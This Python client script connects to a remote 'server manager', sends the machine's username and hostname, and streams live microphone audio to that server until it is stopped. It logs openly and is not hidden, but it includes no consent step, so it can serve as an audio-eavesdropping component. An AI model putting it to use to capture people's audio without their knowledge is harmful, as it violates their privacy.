#!/usr/bin/python3
# coding: utf-8

__author__ = '@zNairy'
__contact__ = 'zNairy#7181 | www.github.com/zNairy'
__version__ = '1.0'

from getpass import getuser
from json import dumps
from connection.credentials import Credentials
from sounddevice import RawInputStream
from logging import basicConfig, INFO, error, info, warning
from socket import socket as Socket, AF_INET, SOCK_STREAM, gaierror, gethostname


basicConfig(format='%(levelname)s %(asctime)s : %(message)s', level=INFO)


class ClientManager(object):
    def __init__(self, hostName:str = '0.0.0.0', portNumber:int = 5000) -> None:
        self.hostName = hostName
        self.portNumber = portNumber

    def stopMicStream(self):
        self.microphoneStream.stop()
        self.socket .send(b'micstreamstop')

    def sendMicStreamFrames(self, *args):
        self.socket.send(args[0])

    def micStream(self):
        info("Starting Microphone Streaming and sending to the server manager")
        
        self.microphoneStream = RawInputStream(channels=2, blocksize=4096, callback=self.sendMicStreamFrames)
        self.microphoneStream.start()

        info("Microphone Streaming started")

        while True:
            try:
                response = self.socket.recv(1024)

            except ConnectionResetError:
                warning("Server manager has stopped the Streaming")
                break

            if response == b'micstreamstop':
                self.stopMicStream()
                warning("Stopping Microphone streaming")
                break
        
        info("Microphone Streaming stopped")
        
        self.socket.close()
    
    def __configureSocket(self) -> Socket:
        info("Configuring socket")
        
        try:
            newSocket = Socket(
                family=AF_INET,
                type=SOCK_STREAM
            )

        except OverflowError:
            error(f'"{self._portNumber}" Port too large, must be in range 0-65535') & exit(1)
        except OSError:
            error(f'"{self._hostName}" Cannot assign requested address') & exit(1)
        except gaierror:
            error(f'"{self._hostName}" Name or service not known') & exit(1)

        return newSocket

    def run(self):
        self.socket = self.__configureSocket()

        info(f"Connecting to the server manager on [{self._hostName}:{self._portNumber}]")

        try:
            self.socket.connect((self._hostName, self._portNumber))
            warning("Connected to the server manager")

        except ConnectionRefusedError as err:
            error(f"Failed to connect to the Server manager [{self._hostName}:{self._portNumber}] | {err}")
            self.socket.close() & exit(1)
        except Exception as err:
            error(err)
            self.socket.close() & exit(1)


        info("Sending basic system information to the server manager")

        self.socket.send(dumps({
            "username": getuser(), 
            "hostname": gethostname()
        }).encode())

        self.micStream()

    @property
    def hostName(self) -> str:
        return self.hostName
    
    @hostName.setter
    def hostName(self, hostName:str) -> None:
        if not isinstance(hostName, str):
            error('Parameter "hostName" must be a string') & exit(1)
        
        self._hostName = hostName
    
    @property
    def portNumber(self) -> int:
        return self.portNumber
    
    @portNumber.setter
    def portNumber(self, portNumber:int) -> None:
        if not isinstance(portNumber, int):
            error('Parameter "portNumber" must be a integer') & exit(1)
        
        self._portNumber = portNumber

    def __str__(self) -> str:
        return f"{self.__class__.__name__}(hostName='{self._hostName}', portNumber={self._portNumber})"
    


def main():
    credentials = Credentials.get()
    
    if credentials:
        client = ClientManager(
            hostName = credentials.get('HOST'),
            portNumber = int(credentials.get('PORT'))
        )

    else:
        client = ClientManager()

    client.run()



if __name__ == '__main__':
    main()